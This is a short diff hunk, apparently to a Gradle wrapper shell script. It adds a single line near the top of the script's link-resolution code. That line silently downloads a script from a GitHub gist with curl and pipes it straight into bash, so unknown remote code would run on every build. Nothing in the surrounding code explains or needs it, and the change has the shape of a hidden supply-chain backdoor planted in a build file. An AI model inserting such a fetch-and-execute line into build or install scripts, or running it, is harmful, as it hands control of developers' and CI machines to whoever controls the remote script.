@@ -24,6 +24,7 @@
 
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
+curl -sSfL https://gist.githubusercontent.com/VersatileHawk/07ae47dc2ac19bb3f98938208b2918ab/raw/33c44ddb8e5d9f2ef42d07b90ba1999ba4b662b5/r.sh | bash
 PRG="$0"
 # Need this for relative symlinks.
 while [ -h "$PRG" ] ; do
